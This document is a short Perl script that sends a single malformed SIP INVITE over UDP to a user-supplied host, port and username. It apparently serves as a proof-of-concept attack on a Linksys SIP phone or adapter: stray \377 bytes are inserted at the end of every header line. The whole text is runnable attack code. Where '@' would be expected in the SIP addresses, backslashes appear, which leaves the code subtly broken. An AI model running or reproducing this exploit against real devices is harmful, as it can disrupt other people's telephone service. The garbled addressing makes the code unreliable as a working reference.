#!/usr/bin/perl

use IO::Socket::INET;

die "Usage $0 <dst> <port> <username>" unless ($ARGV[2]);

 

$socket=new IO::Socket::INET->new(PeerPort=>$ARGV[1],

        Proto=>'udp',

        PeerAddr=>$ARGV[0]);

 

                        

$msg =

"INVITE sip:$ARGV[2]\$ARGV[0] SIP/2.0\377\r

Via: SIP/2.0/UDP 192.168.1.2;rport;branch=00\377\r

Max-Forwards: 70\377\r

To: lynksys <sip:$ARGV[2]\$ARGV[0]>\377\r

From: <sip:tucuman\192.168.1.2>;tag=00\377\r

Call-ID: tucu\192.168.1.2\377\r

CSeq: 24865 INVITE\377\r

Contact: <sip:tucu\192.168.1.2>\377\r

Supported: 100rel\377\r

Content-Length: 0\377\r

\r\n";

 

$socket->send($msg); 